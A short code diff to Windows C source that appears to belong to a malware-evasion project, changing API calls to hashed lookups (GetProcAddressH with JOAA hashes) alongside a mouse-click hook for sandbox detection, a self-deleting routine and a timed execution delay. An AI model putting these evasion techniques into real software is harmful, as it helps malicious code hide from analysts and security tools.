@@ -12,7 +12,7 @@ DWORD g_dwMouseClicks = NULL;
 extern VX_TABLE g_Sys;
 
 // The callback function that will be executed whenever the user clicked a mouse button
-LRESULT CALLBACK HookEvent(int nCode, WPARAM wParam, LPARAM lParam) {
+LRESULT CALLBACK HookEvent(INT nCode, WPARAM wParam, LPARAM lParam) {
 
 	if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {
 #if DEBUG
@@ -55,7 +55,7 @@ BOOL DeleteSelf() {
 	FILE_DISPOSITION_INFO	Delete = { 0 };
 	HANDLE				    hFile = INVALID_HANDLE_VALUE;
 	PFILE_RENAME_INFO		pRename = NULL;
-	const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
+	CONST PWCHAR NewStream = (CONST PWCHAR)NEW_STREAM;
 	SIZE_T				    sRename = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);
 
 	// Allocating enough buffer for the 'FILE_RENAME_INFO' structure
@@ -162,7 +162,7 @@ BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {
 	LARGE_INTEGER           DelayInterval = { 0 };
 	LONGLONG                Delay = NULL;
 	NTSTATUS                STATUS = NULL;
-	fnNtDelayExecution      pNtDelayExecution = (fnNtDelayExecution)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtDelayExecution");
+	fnNtDelayExecution      pNtDelayExecution = (fnNtDelayExecution)GetProcAddressH(GetModuleHandleH(NTDLLDLL_JOAA), NtDelayExecution_JOAA);
 	DWORD                   _T0 = NULL,
 		_T1 = NULL;
 
